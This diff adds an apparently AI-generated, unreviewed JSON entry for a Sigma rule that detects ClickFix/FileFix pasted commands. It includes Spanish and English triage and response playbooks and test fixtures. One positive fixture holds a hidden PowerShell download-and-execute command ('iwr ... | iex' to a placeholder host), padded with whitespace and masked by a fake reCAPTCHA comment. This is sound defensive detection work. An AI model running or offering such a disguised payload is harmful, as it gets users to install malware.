@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "3ae9974a-eb09-4044-8e70-8980a50c12c8",
+    "title": "Suspicious Explorer Process with Whitespace Padding - ClickFix/FileFix",
+    "level": "high",
+    "status": "experimental",
+    "author": "Swachchhanda Shrawan Poudel (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_susp_clickfix_filefix_whitespace_padding.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_susp_clickfix_filefix_whitespace_padding.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027.010",
+      "T1204.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso iniciado por explorer.exe tiene una línea de comandos con un relleno largo de espacios y un carácter '#'. Es el patrón típico de ClickFix/FileFix, en el que el usuario pega un comando malicioso disfrazado de texto inofensivo.",
+      "what_it_detects": "Creación de procesos cuyo ParentImage termina en \\explorer.exe y cuyo CommandLine contiene '#' y al menos 12 espacios seguidos, ya sean ASCII o Unicode (U+2000–U+200A, U+00A0). Así se ve un comando pegado en el cuadro Ejecutar o en la barra de direcciones del Explorador.",
+      "why_it_matters": "ClickFix y FileFix engañan al usuario para que pegue y ejecute él mismo un comando (T1204.004, ejecución de copiar y pegar maliciosa). El relleno de espacios y el comentario '#' esconden el payload real a la vista (T1027.010, ofuscación de comandos). Por lo general descargan y ejecutan malware con los privilegios del usuario.",
+      "triage_steps": [
+        "Revise el CommandLine completo sin truncar y reemplace los espacios Unicode para ver qué texto queda oculto antes y después del '#'.",
+        "Identifique el Image hijo (powershell.exe, mshta.exe, cmd.exe, curl.exe) y busque URL, dominios o cadenas codificadas en el comando.",
+        "Revise HKCU\\...\\Explorer\\RunMRU y TypedPaths del usuario para confirmar si el comando se pegó en Ejecutar o en el Explorador.",
+        "Revise la actividad del navegador en el mismo host +/- 15 minutos para encontrar la página o el documento de phishing que mostró las instrucciones falsas.",
+        "Liste los procesos hijos, las conexiones de red, las descargas y los archivos creados por el proceso alertado y sus descendientes.",
+        "Busque el mismo dominio, hash o patrón de CommandLine en otros endpoints y revise alertas anteriores del mismo usuario y host.",
+        "Pregunte al usuario si siguió instrucciones de un CAPTCHA, una verificación o un supuesto soporte técnico."
+      ],
+      "false_positives": [
+        "El campo falsepositives de la regla dice 'Unknown'. Es poco probable que haya uso legítimo con relleno largo de espacios y '#'.",
+        "Accesos directos o scripts internos lanzados desde el Explorador cuyos argumentos tienen muchos espacios ASCII y un '#', por ejemplo rutas o comentarios."
+      ],
+      "response_steps": [
+        "Verifique el comando decodificado y su actividad hija. Si es malicioso, aísle el endpoint desde el EDR.",
+        "Bloquee los dominios, URL y hashes identificados en el proxy, el DNS y el EDR.",
+        "Elimine los payloads y la persistencia que se confirmen, como tareas programadas, claves Run o archivos en %AppData% y %Temp%.",
+        "Restablezca las credenciales del usuario y revoque sus sesiones si hubo un posible robo de información, por ejemplo con un infostealer.",
+        "Notifique a los usuarios sobre la campaña y busque otras víctimas del mismo señuelo."
+      ],
+      "severity_rationale": "El nivel high se justifica porque el patrón casi no tiene uso legítimo y suele indicar que el usuario ya ejecutó un comando de un atacante."
+    },
+    "en": {
+      "summary": "A process launched by explorer.exe has a command line with long whitespace padding and a '#' character. This is the usual ClickFix/FileFix pattern, where a user pastes a malicious command disguised as harmless text.",
+      "what_it_detects": "Process creation where ParentImage ends with \\explorer.exe and CommandLine contains '#' plus at least 12 consecutive spaces, either ASCII or Unicode (U+2000–U+200A, U+00A0). This is what a command pasted into the Run dialog or the Explorer address bar looks like.",
+      "why_it_matters": "ClickFix and FileFix trick users into pasting and running a command themselves (T1204.004, malicious copy and paste). Whitespace padding and a '#' comment hide the real payload from view (T1027.010, command obfuscation). The usual result is malware being downloaded and run with the user's privileges.",
+      "triage_steps": [
+        "Read the full, untruncated CommandLine. Replace the Unicode spaces to show the text hidden before and after the '#'.",
+        "Identify the child Image (powershell.exe, mshta.exe, cmd.exe, curl.exe) and pull out any URLs, domains or encoded strings.",
+        "Check the user's HKCU\\...\\Explorer\\RunMRU and TypedPaths to confirm whether the command was pasted into Run or Explorer.",
+        "Review browser activity on the same host within +/- 15 minutes to find the phishing page or lure document.",
+        "List child processes, network connections, downloads and files created by the alerted process and its descendants.",
+        "Hunt for the same domain, hash or CommandLine pattern on other endpoints. Review earlier alerts for this user and host.",
+        "Ask the user whether they followed CAPTCHA, verification or 'IT support' instructions."
+      ],
+      "false_positives": [
+        "The rule's falsepositives field says 'Unknown'. Legitimate use with long whitespace padding and a '#' is unlikely.",
+        "Internal shortcuts or scripts launched from Explorer whose arguments contain many ASCII spaces and a '#', such as paths or comments."
+      ],
+      "response_steps": [
+        "Verify the decoded command and its child activity. If it is malicious, isolate the endpoint through EDR.",
+        "Block the identified domains, URLs and hashes at the proxy, DNS and EDR.",
+        "Remove confirmed payloads and persistence, such as scheduled tasks, Run keys or files in %AppData% and %Temp%.",
+        "Reset the user's credentials and revoke their sessions if data theft is possible, for example from an infostealer.",
+        "Warn users about the campaign and look for other victims of the same lure."
+      ],
+      "severity_rationale": "The high level fits because this pattern has almost no legitimate use and usually means the user has already run an attacker's command."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "ClickFix: PowerShell launched from the Run dialog. The command is followed by long ASCII space padding and a fake verification comment after '#'.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -w h -c \"iwr https://cdn.example.com/verify.txt | iex\"                                                            # I am not a robot - reCAPTCHA Verification ID: 4821",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "FileFix: command pasted into the File Explorer address bar, with '#' followed by padding and a fake document path.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -c \"ping example.org\" #                                                  C:\\Company\\Internal-Share\\HR-Policy-2025.docx",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Notepad opened from Explorer on a file whose name contains '#', with no whitespace padding.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "Image": "C:\\Windows\\System32\\notepad.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\notepad.exe\" C:\\Users\\jperez\\Documents\\C# notes.txt",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Padded command line with '#', but the parent is cmd.exe from a batch script rather than explorer.exe.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "Image": "C:\\Windows\\System32\\findstr.exe",
+          "CommandLine": "findstr /c:\"#                    \" C:\\build\\config.ini",
+          "IntegrityLevel": "High"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
